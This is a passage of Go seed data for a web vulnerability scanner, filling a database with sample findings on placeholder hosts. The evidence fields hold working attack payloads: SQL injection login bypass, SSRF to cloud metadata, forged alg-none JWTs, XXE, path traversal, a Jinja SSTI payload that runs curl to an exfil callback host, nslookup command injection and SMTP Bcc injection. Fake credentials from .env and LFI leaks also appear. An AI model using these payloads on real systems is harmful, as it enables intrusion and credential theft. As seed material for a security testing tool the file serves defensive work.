			MatchedAt:        []string{"https://api.shop.local/api/v1/auth/login", "/opt/repos/shop-api/app/routes/auth.py:28"},
			ExtractedResults: []string{"payload: ' OR 1=1--", "bypassed_user: admin", "token_leaked: true"},
			Request:          "POST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"' OR 1=1--\",\"password\":\"anything\"}",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\":\"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fake-jwt-sig\",\"user\":{\"id\":1,\"name\":\"admin\",\"role\":\"admin\"}}",
			AdditionalEvidence: []string{
				"Source: app/routes/auth.py:25-35\n---------\n@router.post(\"/api/v1/auth/login\")\nasync def login(creds: LoginSchema):\n    query = f\"SELECT * FROM users WHERE username='{creds.username}' AND password='{hash(creds.password)}'\"\n    user = await db.fetch_one(query)\n    if user:\n        token = create_jwt(user)\n        return {\"token\": token, \"user\": user}\n    raise HTTPException(401, \"Invalid credentials\")",
				"Normal login attempt:\nPOST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin\",\"password\":\"wrong\"}\n---------\nHTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\n\r\n{\"detail\":\"Invalid credentials\"}",
			},
			FindingHash: hashStr([]byte("agent-auth-bypass-api.shop.local-/api/v1/auth/login")),
			FoundAt:     now.Add(-2*time.Hour - 55*time.Minute),
			CreatedAt:   now.Add(-2*time.Hour - 55*time.Minute),
		},
		// Agent: SSRF found by swarm agent
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/products")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			AgenticScanUUID:  "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			URL:              "https://api.shop.local/api/v1/products/import",
			Hostname:         "api.shop.local",
			ModuleID:         "agent-ssrf",
			ModuleName:       "Agent SSRF Detection",
			ModuleType:       database.ModuleTypeAgent,
			ModuleShort:      "AI agent detected server-side request forgery",
			FindingSource:    database.FindingSourceAgent,
			Description:      "SSRF via product import URL — the import endpoint fetches a user-supplied URL to import product data. Agent redirected the request to internal metadata endpoint and received cloud instance credentials",
			Severity:         "critical",
			Confidence:       "certain",
			Tags:             []string{"agent", "ssrf", "cloud-metadata", "cwe-918"},
			Status:           "triaged",
			Remediation:      "Implement URL allowlist for import sources. Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x) and cloud metadata endpoints",
			CWEID:            "CWE-918",
			CVSSScore:        9.1,
			MatchedAt:        []string{"https://api.shop.local/api/v1/products/import"},
			ExtractedResults: []string{"internal_url: http://169.254.169.254/latest/meta-data/iam/security-credentials/", "leaked: AWS IAM credentials"},
			Request:          "POST /api/v1/products/import HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n{\"source_url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"error\":\"invalid JSON format\",\"raw_content\":\"{\\\"Code\\\":\\\"Success\\\",\\\"AccessKeyId\\\":\\\"AKIAIOSFODNN7EXAMPLE\\\",\\\"SecretAccessKey\\\":\\\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\\"}\"}",
			AdditionalEvidence: []string{
				"Step 1 — Agent tested with external URL:\nPOST /api/v1/products/import HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"source_url\":\"https://example.com/products.json\"}\n---------\nHTTP/1.1 200 OK\r\n\r\n{\"imported\":0,\"message\":\"No valid products found\"}",
				"Step 2 — Agent tested internal network:\nPOST /api/v1/products/import HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"source_url\":\"http://127.0.0.1:8080/admin\"}\n---------\nHTTP/1.1 200 OK\r\n\r\n{\"error\":\"invalid JSON format\",\"raw_content\":\"<html><title>Internal Admin</title></html>\"}",
			},
			FindingHash: hashStr([]byte("agent-ssrf-api.shop.local-/api/v1/products/import")),
			FoundAt:     now.Add(-1*time.Hour - 10*time.Minute),
			CreatedAt:   now.Add(-1*time.Hour - 10*time.Minute),
		},

		// =====================================================================
		// Extension finding — from custom JS extension
		// =====================================================================
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/auth/login")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			URL:              "https://api.shop.local/api/v1/auth/login",
			Hostname:         "api.shop.local",
			ModuleID:         "ext-jwt-none-algo",
			ModuleName:       "JWT None Algorithm",
			ModuleType:       database.ModuleTypeExtension,
			ModuleShort:      "Custom JS extension detects JWT 'none' algorithm bypass",
			FindingSource:    database.FindingSourceExtension,
			Description:      "JWT 'none' algorithm accepted — modified JWT token with alg:none and empty signature is accepted by the server, allowing forged tokens without the signing key",
			Severity:         "critical",
			Confidence:       "certain",
			Tags:             []string{"extension", "jwt", "auth-bypass", "cwe-347"},
			Status:           "triaged",
			Remediation:      "Explicitly reject 'none' algorithm in JWT verification. Set allowedAlgorithms: ['HS256', 'RS256'] in the JWT library configuration",
			CWEID:            "CWE-347",
			CVSSScore:        9.1,
			MatchedAt:        []string{"https://api.shop.local/api/v1/users/me"},
			ExtractedResults: []string{"original_alg: HS256", "forged_alg: none", "forged_role: admin"},
			Request:          "GET /api/v1/users/me HTTP/1.1\r\nHost: api.shop.local\r\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"id\":1,\"email\":\"user@shop.local\",\"name\":\"Shop Admin\",\"role\":\"admin\"}",
			AdditionalEvidence: []string{
				"Original token (HS256): eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.valid-sig\nForged token (none): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
			},
			FindingHash: hashStr([]byte("ext-jwt-none-api.shop.local")),
			FoundAt:     now.Add(-1*time.Hour - 20*time.Minute),
			CreatedAt:   now.Add(-1*time.Hour - 20*time.Minute),
		},

		// =====================================================================
		// OAST finding — out-of-band interaction
		// =====================================================================
		{
			HTTPRecordUUIDs:  []string{findRec("/api/soap/UserService")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			URL:              "https://example.com/api/soap/UserService",
			Hostname:         "example.com",
			ModuleID:         "oast-xxe-oob",
			ModuleName:       "XXE Out-of-Band",
			ModuleType:       database.ModuleTypeOAST,
			ModuleShort:      "Detects XXE via out-of-band DNS/HTTP interaction",
			FindingSource:    database.FindingSourceOAST,
			Description:      "Blind XXE confirmed via out-of-band DNS callback — XML entity triggered DNS lookup to attacker-controlled domain, confirming the XML parser processes external entities",
			Severity:         "high",
			Confidence:       "certain",
			Tags:             []string{"oast", "xxe", "xml", "blind", "oob", "cwe-611"},
			Status:           "triaged",
			Remediation:      "Disable external entity processing in the XML parser. For Java: factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)",
			CWEID:            "CWE-611",
			CVSSScore:        7.5,
			MatchedAt:        []string{"https://example.com/api/soap/UserService"},
			ExtractedResults: []string{"oast_domain: xxe-probe.oast.vigolium.io", "interaction_type: dns", "dns_query: xxe-probe.oast.vigolium.io", "source_ip: 10.0.0.50"},
			Request:          "POST /api/soap/UserService HTTP/1.1\r\nHost: example.com\r\nContent-Type: text/xml; charset=UTF-8\r\nSOAPAction: GetUser\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://xxe-probe.oast.vigolium.io/exfil\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetUser><ID>&xxe;</ID></GetUser></soap:Body></soap:Envelope>",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/xml; charset=UTF-8\r\n\r\n<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetUserResponse><Error>User not found</Error></GetUserResponse></soap:Body></soap:Envelope>",
			AdditionalEvidence: []string{
				"OAST interaction received:\nTimestamp: 2026-03-29T08:15:32Z\nType: DNS\nQuery: xxe-probe.oast.vigolium.io\nSource IP: 10.0.0.50\nCorrelation ID: xxe-probe\n---------\nThe DNS query originated from the target server IP (10.0.0.50 = api.shop.local) confirming server-side entity resolution.",
			},
			FindingHash: hashStr([]byte("oast-xxe-oob-example.com-/api/soap/UserService")),
			FoundAt:     now.Add(-50 * time.Minute),
			CreatedAt:   now.Add(-50 * time.Minute),
		},
		// OAST: Blind SSRF via out-of-band callback
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/products")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			URL:              "https://api.shop.local/api/v1/webhooks",
			Hostname:         "api.shop.local",
			ModuleID:         "oast-ssrf-callback",
			ModuleName:       "SSRF Out-of-Band Callback",
			ModuleType:       database.ModuleTypeOAST,
			ModuleShort:      "Detects blind SSRF via out-of-band HTTP callback",
			FindingSource:    database.FindingSourceOAST,
			Description:      "Blind SSRF confirmed via HTTP callback — webhook URL parameter triggered HTTP request to OAST server with internal headers (X-Internal-Token) leaked in the callback",
			Severity:         "high",
			Confidence:       "certain",
			Tags:             []string{"oast", "ssrf", "blind", "webhook", "cwe-918"},
			Status:           "triaged",
			Remediation:      "Validate webhook URLs against an allowlist of trusted domains. Block requests to private IP ranges and metadata endpoints",
			CWEID:            "CWE-918",
			CVSSScore:        7.5,
			MatchedAt:        []string{"https://api.shop.local/api/v1/webhooks"},
			ExtractedResults: []string{"oast_domain: ssrf-cb.oast.vigolium.io", "interaction_type: http", "leaked_header: X-Internal-Token: intl-tok-a1b2c3"},
			Request:          "POST /api/v1/webhooks HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\nAuthorization: Bearer shop-api-token-abc123\r\n\r\n{\"event\":\"order.completed\",\"callback_url\":\"http://ssrf-cb.oast.vigolium.io/hook\"}",
			Response:         "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\n\r\n{\"id\":\"wh-001\",\"event\":\"order.completed\",\"callback_url\":\"http://ssrf-cb.oast.vigolium.io/hook\",\"status\":\"active\"}",
			AdditionalEvidence: []string{
				"OAST interaction received:\nTimestamp: 2026-03-29T08:20:15Z\nType: HTTP\nMethod: POST\nPath: /hook\nSource IP: 10.0.0.50\nHeaders:\n  User-Agent: ShopAPI/1.0\n  X-Internal-Token: intl-tok-a1b2c3\n  Content-Type: application/json\nBody: {\"event\":\"order.completed\",\"order_id\":\"test\"}",
			},
			FindingHash: hashStr([]byte("oast-ssrf-cb-api.shop.local-/api/v1/webhooks")),
			FoundAt:     now.Add(-47 * time.Minute),
			CreatedAt:   now.Add(-47 * time.Minute),
		},

		// =====================================================================
		// Known-issue-scan finding — from Nuclei templates
		// =====================================================================
		{
			HTTPRecordUUIDs:  []string{findRec("/admin/")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			URL:              "https://admin.example.com:8443/.env",
			Hostname:         "admin.example.com",
			ModuleID:         "nuclei-dotenv-exposure",
			ModuleName:       "Environment File Exposure",
			ModuleType:       database.ModuleTypeKnownIssueScan,
			ModuleShort:      "Detects exposed .env files with sensitive configuration",
			FindingSource:    database.FindingSourceKnownIssueScan,
			Description:      "Exposed .env file at /.env contains database credentials, API keys, and JWT secret in plaintext — accessible without authentication",
			Severity:         "high",
			Confidence:       "certain",
			Tags:             []string{"known-issue", "nuclei", "exposure", "config", "cwe-200"},
			Status:           "triaged",
			Remediation:      "Block access to .env files in web server configuration. Add 'location ~ /\\.env { deny all; }' to nginx config or equivalent",
			CWEID:            "CWE-200",
			CVSSScore:        7.5,
			MatchedAt:        []string{"https://admin.example.com:8443/.env"},
			ExtractedResults: []string{"DB_PASSWORD=p0stgr3s_pr0d!", "JWT_SECRET=sup3r-s3cret-k3y-d0nt-t3ll", "AWS_SECRET_ACCESS_KEY=wJalrXU..."},
			Request:          "GET /.env HTTP/1.1\r\nHost: admin.example.com:8443\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n\r\nDATABASE_URL=postgresql://admin:p0stgr3s_pr0d!@db.internal:5432/shopdb\nJWT_SECRET=sup3r-s3cret-k3y-d0nt-t3ll\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nSMTP_PASSWORD=m@il_p@ss_123\nREDIS_URL=redis://cache.internal:6379",
			FindingHash:      hashStr([]byte("nuclei-dotenv-admin.example.com")),
			FoundAt:          now.Add(-3*time.Hour - 50*time.Minute),
			CreatedAt:        now.Add(-3*time.Hour - 50*time.Minute),
		},
		// Known-issue-scan: Spring Boot Actuator exposed
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/health")},
			ScanUUID:         "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
			URL:              "https://api.shop.local/actuator/env",
			Hostname:         "api.shop.local",
			ModuleID:         "nuclei-springboot-actuator",
			ModuleName:       "Spring Boot Actuator Exposure",
			ModuleType:       database.ModuleTypeKnownIssueScan,
			ModuleShort:      "Detects exposed Spring Boot Actuator endpoints",
			FindingSource:    database.FindingSourceKnownIssueScan,
			Description:      "Spring Boot Actuator /actuator/env endpoint exposed without authentication — reveals environment variables including database credentials and internal service URLs",
			Severity:         "medium",
			Confidence:       "certain",
			Tags:             []string{"known-issue", "nuclei", "spring", "actuator", "cwe-200"},
			Status:           "accepted_risk",
			Remediation:      "Restrict actuator endpoints to internal network only. Set management.endpoints.web.exposure.include=health,info and bind management server to localhost",
			CWEID:            "CWE-200",
			CVSSScore:        5.3,
			MatchedAt:        []string{"https://api.shop.local/actuator/env"},
			ExtractedResults: []string{"spring.datasource.url=jdbc:postgresql://db.internal:5432/shopdb", "endpoints_exposed: env,beans,mappings,health"},
			Request:          "GET /actuator/env HTTP/1.1\r\nHost: api.shop.local\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: application/vnd.spring-boot.actuator.v3+json\r\n\r\n{\"activeProfiles\":[\"production\"],\"propertySources\":[{\"name\":\"systemEnvironment\",\"properties\":{\"DATABASE_URL\":{\"value\":\"postgresql://admin:***@db.internal:5432/shopdb\"},\"REDIS_URL\":{\"value\":\"redis://cache.internal:6379\"}}}]}",
			FindingHash:      hashStr([]byte("nuclei-actuator-api.shop.local")),
			FoundAt:          now.Add(-3*time.Hour - 48*time.Minute),
			CreatedAt:        now.Add(-3*time.Hour - 48*time.Minute),
		},

		// =====================================================================
		// Findings with non-default lifecycle statuses
		// =====================================================================

		// False positive — marked by user
		{
			HTTPRecordUUIDs:  []string{findRec("/search?q=test")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			URL:              "https://example.com/search?q=%3Csvg+onload=alert()%3E",
			Hostname:         "example.com",
			ModuleID:         "xss-reflected-param",
			ModuleName:       "xss",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects reflected cross-site scripting via parameter injection",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "Reflected XSS via 'q' parameter — SVG onload payload echoed but CSP blocks execution",
			Severity:         "high",
			Confidence:       "firm",
			Tags:             []string{"xss", "reflected", "csp-blocked"},
			Status:           "false_positive",
			Remediation:      "Not applicable — CSP header Content-Security-Policy: script-src 'self' effectively blocks this vector",
			MatchedAt:        []string{"https://example.com/search?q=<svg+onload=alert()>"},
			ExtractedResults: []string{"<svg onload=alert()>"},
			Request:          "GET /search?q=%3Csvg+onload%3Dalert()%3E HTTP/1.1\r\nHost: example.com\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Security-Policy: script-src 'self'\r\n\r\n<!DOCTYPE html>\n<html><body><p>You searched for: <svg onload=alert()></p></body></html>",
			FindingHash:      hashStr([]byte("xss-fp-example.com-/search-q-svg")),
			FoundAt:          now.Add(-80 * time.Minute),
			CreatedAt:        now.Add(-80 * time.Minute),
		},
		// Fixed finding
		{
			HTTPRecordUUIDs:  []string{findRec("/admin/logs")},
			ScanUUID:         "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
			URL:              "https://admin.example.com:8443/admin/logs?file=../../../proc/self/environ",
			Hostname:         "admin.example.com",
			ModuleID:         "lfi-path-traversal",
			ModuleName:       "lfi",
			ModuleType:       database.ModuleTypeActive,
			ModuleShort:      "Detects local file inclusion via path traversal",
			FindingSource:    database.FindingSourceDynamicAssessment,
			Description:      "LFI via 'file' parameter — /proc/self/environ leaked environment variables including database credentials (now patched with path sanitization)",
			Severity:         "critical",
			Confidence:       "certain",
			Tags:             []string{"lfi", "path-traversal", "env-leak"},
			Status:           "fixed",
			Remediation:      "Fixed in commit a1b2c3d: added filepath.Clean() and basepath check to logs handler. Verified fix prevents traversal outside /var/log/",
			CWEID:            "CWE-22",
			CVSSScore:        9.1,
			MatchedAt:        []string{"https://admin.example.com:8443/admin/logs?file=../../../proc/self/environ"},
			ExtractedResults: []string{"DATABASE_URL=postgresql://admin:p0stgr3s_pr0d!@db.internal:5432/shopdb"},
			Request:          "GET /admin/logs?file=../../../proc/self/environ HTTP/1.1\r\nHost: admin.example.com:8443\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\n",
			Response:         "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nDATABASE_URL=postgresql://admin:p0stgr3s_pr0d!@db.internal:5432/shopdb\x00JWT_SECRET=sup3r-s3cret-k3y\x00PATH=/usr/local/bin:/usr/bin",
			FindingHash:      hashStr([]byte("lfi-fixed-admin.example.com-/admin/logs-environ")),
			FoundAt:          now.Add(-6 * time.Hour),
			CreatedAt:        now.Add(-6 * time.Hour),
		},

		// =====================================================================
		// Agent source analysis finding — code audit without HTTP interaction
		// =====================================================================
		{
			HTTPRecordUUIDs:  []string{findRec("/post/hello-world")},
			AgenticScanUUID:  "agent-0001-aaaa-bbbb-cccc-ddddeeee0001",
			URL:              "https://blog.test/post/:slug/comment",
			Hostname:         "blog.test",
			ModuleID:         "agent-code-audit-sqli",
			ModuleName:       "Agent Code Audit",
			ModuleType:       database.ModuleTypeAgent,
			ModuleShort:      "AI agent identified vulnerability through source code analysis",
			FindingSource:    database.FindingSourceAgent,
			Description:      "SQL injection in comment submission — Rails controller uses string interpolation in ActiveRecord where clause. User-controlled 'author' field concatenated into SQL without parameterization",
			Severity:         "high",
			Confidence:       "firm",
			Tags:             []string{"agent", "code-audit", "sqli", "ruby", "rails", "cwe-89"},
			Status:           "triaged",
			Remediation:      "Replace Comment.where(\"author = '#{params[:author]}'\") with Comment.where(author: params[:author]) to use parameterized query",
			CWEID:            "CWE-89",
			CVSSScore:        8.6,
			SourceFile:       "/opt/repos/blog-engine/app/controllers/comments_controller.rb:18",
			MatchedAt:        []string{"/opt/repos/blog-engine/app/controllers/comments_controller.rb:18"},
			ExtractedResults: []string{"Comment.where(\"author = '#{params[:author]}'\")", "sink: ActiveRecord.where(string)", "parameter: author"},
			AdditionalEvidence: []string{
				"Source: app/controllers/comments_controller.rb:15-25\n---------\ndef create\n  # BUG: string interpolation in SQL\n  existing = Comment.where(\"author = '#{params[:author]}' AND post_id = #{@post.id}\")\n  if existing.count >= 3\n    render json: { error: 'Too many comments' }, status: 429\n    return\n  end\n  @comment = Comment.new(comment_params)\n  @comment.post = @post\n  @comment.save\nend",
				"Agent reasoning: The where() call uses Ruby string interpolation (#{}) instead of parameterized placeholders (?). Both author (user input) and post_id (from URL) are interpolated. While post_id is an integer from the route, author is a free-text field accepting arbitrary input including SQL metacharacters.",
			},
			FindingHash: hashStr([]byte("agent-code-audit-sqli-blog-comments_controller.rb-18")),
			FoundAt:     now.Add(-2*time.Hour - 50*time.Minute),
			CreatedAt:   now.Add(-2*time.Hour - 50*time.Minute),
		},
		// Agent source analysis: Race condition in order processing
		{
			HTTPRecordUUIDs:  []string{findRec("/api/v1/orders")},
			AgenticScanUUID:  "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			URL:              "https://api.shop.local/api/v1/orders",
			Hostname:         "api.shop.local",
			ModuleID:         "agent-code-audit-race",
			ModuleName:       "Agent Code Audit",
			ModuleType:       database.ModuleTypeAgent,
			ModuleShort:      "AI agent identified race condition through source code analysis",
			FindingSource:    database.FindingSourceAgent,
			Description:      "Time-of-check-to-time-of-use (TOCTOU) race condition in order placement — balance check and deduction are not atomic, allowing concurrent requests to overdraw account balance",
			Severity:         "medium",
			Confidence:       "firm",
			Tags:             []string{"agent", "code-audit", "race-condition", "toctou", "python", "cwe-367"},
			Status:           "triaged",
			Remediation:      "Use SELECT ... FOR UPDATE or database-level advisory lock to make the balance check and deduction atomic within a single transaction",
			CWEID:            "CWE-367",
			CVSSScore:        5.9,
			SourceFile:       "/opt/repos/shop-api/app/routes/orders.py:45",
			MatchedAt:        []string{"/opt/repos/shop-api/app/routes/orders.py:45"},
			ExtractedResults: []string{"check: user.balance >= order.total", "deduct: user.balance -= order.total", "gap: 2 separate queries without lock"},
			AdditionalEvidence: []string{
				"Source: app/routes/orders.py:40-55\n---------\n@router.post(\"/api/v1/orders\")\nasync def create_order(order: OrderSchema, user=Depends(get_user)):\n    # Check balance (TOCTOU: not atomic with deduction)\n    user = await db.fetch_one(\"SELECT * FROM users WHERE id = ?\", [user.id])\n    if user.balance < order.total:\n        raise HTTPException(400, \"Insufficient balance\")\n    # Deduct balance\n    await db.execute(\n        \"UPDATE users SET balance = balance - ? WHERE id = ?\",\n        [order.total, user.id]\n    )\n    # Create order\n    await db.execute(\"INSERT INTO orders ...\")\n    return {\"status\": \"created\"}",
			},
			FindingHash: hashStr([]byte("agent-code-audit-race-shop-api-orders.py-45")),
			FoundAt:     now.Add(-1*time.Hour - 5*time.Minute),
			CreatedAt:   now.Add(-1*time.Hour - 5*time.Minute),
		},
	}

	return findings
}

// ---------------------------------------------------------------------------
// Scope seeds
// ---------------------------------------------------------------------------

func seedScopes() []*database.Scope {
	now := time.Now()
	return []*database.Scope{
		{
			Name:        "Include all example.com subdomains",
			Description: "Scan all *.example.com hosts",
			RuleType:    "include",
			HostPattern: "*.example.com",
			Priority:    10,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "Include api.shop.local",
			Description: "Scan the shop API",
			RuleType:    "include",
			HostPattern: "api.shop.local",
			Priority:    20,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "Include blog.test",
			Description: "Scan the blog",
			RuleType:    "include",
			HostPattern: "blog.test",
			Priority:    30,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "Exclude static assets",
			Description: "Skip CDN and static resource paths",
			RuleType:    "exclude",
			HostPattern: "cdn.example.com",
			Priority:    5,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "Exclude image paths",
			Description: "Skip scanning image file paths",
			RuleType:    "exclude",
			PathPattern: "*.png,*.jpg,*.gif,*.svg,*.ico",
			Priority:    6,
			Enabled:     true,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
		{
			Name:        "HTTPS only",
			Description: "Only scan HTTPS traffic (disabled by default for legacy testing)",
			RuleType:    "include",
			Schemes:     []string{"https"},
			Priority:    50,
			Enabled:     false,
			CreatedAt:   now,
			UpdatedAt:   now,
		},
	}
}

func seedOASTInteractions(scans []*database.Scan) []*database.OASTInteraction {
	now := time.Now()
	oastDomain := "seed.oast.example"

	return []*database.OASTInteraction{
		// DNS interaction — SSRF probe on api.shop.local
		{
			ScanUUID:      scans[1].UUID,
			UniqueID:      "seed-oast-dns-001",
			FullID:        "seed-oast-dns-001." + oastDomain,
			Protocol:      "dns",
			QType:         "A",
			RawRequest:    ";; QUESTION SECTION:\n;seed-oast-dns-001." + oastDomain + ". IN A",
			RawResponse:   ";; ANSWER SECTION:\nseed-oast-dns-001." + oastDomain + ". 300 IN A 127.0.0.1",
			RemoteAddress: "10.0.0.50:53214",
			InteractedAt:  now.Add(-4*time.Hour - 18*time.Minute),
			TargetURL:     "https://api.shop.local/api/v1/products?url=http://seed-oast-dns-001." + oastDomain,
			ParameterName: "url",
			InjectionType: "ssrf",
			ModuleID:      "ssrf-detection",
			Payload:       "http://seed-oast-dns-001." + oastDomain + "/",
			CreatedAt:     now.Add(-4*time.Hour - 18*time.Minute),
		},
		// HTTP interaction — SSRF probe confirming out-of-band HTTP callback
		{
			ScanUUID:      scans[1].UUID,
			UniqueID:      "seed-oast-http-001",
			FullID:        "seed-oast-http-001." + oastDomain,
			Protocol:      "http",
			RawRequest:    "GET / HTTP/1.1\r\nHost: seed-oast-http-001." + oastDomain + "\r\nUser-Agent: Java/11.0.2\r\n\r\n",
			RawResponse:   "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><head></head><body></body></html>",
			RemoteAddress: "10.0.0.50:48932",
			InteractedAt:  now.Add(-4*time.Hour - 17*time.Minute),
			TargetURL:     "https://api.shop.local/api/v1/products?callback=http://seed-oast-http-001." + oastDomain,
			ParameterName: "callback",
			InjectionType: "ssrf",
			ModuleID:      "ssrf-detection",
			Payload:       "http://seed-oast-http-001." + oastDomain + "/",
			CreatedAt:     now.Add(-4*time.Hour - 17*time.Minute),
		},
		// DNS interaction — XXE probe on example.com SOAP endpoint
		{
			ScanUUID:      scans[0].UUID,
			UniqueID:      "seed-oast-dns-002",
			FullID:        "seed-oast-dns-002." + oastDomain,
			Protocol:      "dns",
			QType:         "A",
			RawRequest:    ";; QUESTION SECTION:\n;seed-oast-dns-002." + oastDomain + ". IN A",
			RawResponse:   ";; ANSWER SECTION:\nseed-oast-dns-002." + oastDomain + ". 300 IN A 127.0.0.1",
			RemoteAddress: "93.184.216.34:41872",
			InteractedAt:  now.Add(-105 * time.Minute),
			TargetURL:     "https://example.com/api/soap/UserService",
			ParameterName: "",
			InjectionType: "xxe",
			ModuleID:      "xxe-generic",
			Payload:       `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://seed-oast-dns-002.` + oastDomain + `/xxe"> ]><foo>&xxe;</foo>`,
			CreatedAt:     now.Add(-105 * time.Minute),
		},
		// HTTP interaction — blind SSTI on admin settings (out-of-band confirmation)
		{
			ScanUUID:      scans[0].UUID,
			UniqueID:      "seed-oast-http-002",
			FullID:        "seed-oast-http-002." + oastDomain,
			Protocol:      "http",
			RawRequest:    "GET /exfil?data=49 HTTP/1.1\r\nHost: seed-oast-http-002." + oastDomain + "\r\nUser-Agent: curl/7.81.0\r\n\r\n",
			RawResponse:   "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><head></head><body></body></html>",
			RemoteAddress: "93.184.216.37:52100",
			InteractedAt:  now.Add(-94 * time.Minute),
			TargetURL:     "https://admin.example.com:8443/admin/settings",
			ParameterName: "debug",
			InjectionType: "ssti",
			ModuleID:      "ssti-detection",
			Payload:       "{{''.__class__.__mro__[1].__subclasses__()[407]('curl http://seed-oast-http-002." + oastDomain + "/exfil?data=' + (7*7)|string, shell=True)}}",
			CreatedAt:     now.Add(-94 * time.Minute),
		},
		// DNS interaction — blind command injection probe on legacy app
		{
			ScanUUID:      "",
			UniqueID:      "seed-oast-dns-003",
			FullID:        "seed-oast-dns-003." + oastDomain,
			Protocol:      "dns",
			QType:         "A",
			RawRequest:    ";; QUESTION SECTION:\n;seed-oast-dns-003." + oastDomain + ". IN A",
			RawResponse:   ";; ANSWER SECTION:\nseed-oast-dns-003." + oastDomain + ". 300 IN A 127.0.0.1",
			RemoteAddress: "93.184.216.35:39201",
			InteractedAt:  now.Add(-80 * time.Minute),
			TargetURL:     "http://legacy.example.com/cgi-bin/submit.cgi",
			ParameterName: "name",
			InjectionType: "cmdi",
			ModuleID:      "oast-probe",
			Payload:       "test$(nslookup+seed-oast-dns-003." + oastDomain + ")",
			CreatedAt:     now.Add(-80 * time.Minute),
		},
		// SMTP interaction — email header injection / SSRF via SMTP
		{
			ScanUUID:      scans[0].UUID,
			UniqueID:      "seed-oast-smtp-001",
			FullID:        "seed-oast-smtp-001." + oastDomain,
			Protocol:      "smtp",
			RawRequest:    "EHLO seed-oast-smtp-001." + oastDomain + "\r\nMAIL FROM:<test@attacker.com>\r\nRCPT TO:<admin@example.com>\r\nDATA\r\nSubject: test\r\n\r\ntest body\r\n.\r\n",
			RawResponse:   "220 seed-oast-smtp-001." + oastDomain + " ESMTP\r\n250 OK\r\n250 OK\r\n354 Start mail input\r\n250 OK",
			RemoteAddress: "93.184.216.34:59432",
			InteractedAt:  now.Add(-96 * time.Minute),
			TargetURL:     "https://example.com/contact",
			ParameterName: "email",
			InjectionType: "ssrf",
			ModuleID:      "oast-probe",
			Payload:       "victim%40example.com%0d%0aBcc%3A+attacker%40seed-oast-smtp-001." + oastDomain,
			CreatedAt:     now.Add(-96 * time.Minute),
		},
		// DNS interaction — uncorrelated (no target context, simulates noise)
		{
			UniqueID:      "seed-oast-dns-noise",
			FullID:        "seed-oast-dns-noise." + oastDomain,
			Protocol:      "dns",
